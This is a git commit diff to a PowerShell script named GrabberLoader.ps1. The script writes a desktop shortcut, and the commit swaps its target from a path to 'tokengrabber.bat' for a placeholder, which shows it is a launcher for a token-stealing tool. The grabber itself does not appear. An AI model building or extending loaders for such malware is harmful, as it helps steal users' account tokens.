6fbe1087a3526f1791caac4631d42c9b727d38c0
D00MTrooper <122827195+D00MTrooper@users.noreply.github.com>
2023-01-17 18:06:28 +0100

    Update GrabberLoader.ps1

--- GrabberLoader.ps1
+++ GrabberLoader.ps1
@@ -1,5 +1,5 @@
 $username = $env:USERNAME
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut("$env:USERPROFILE\Desktop\MyShortcut.lnk")
-$Shortcut.TargetPath = "C:\Users\JJJ\Desktop\tokengrabber.bat"
+$Shortcut.TargetPath = "PATH TO GRABBER"
 $Shortcut.Save()
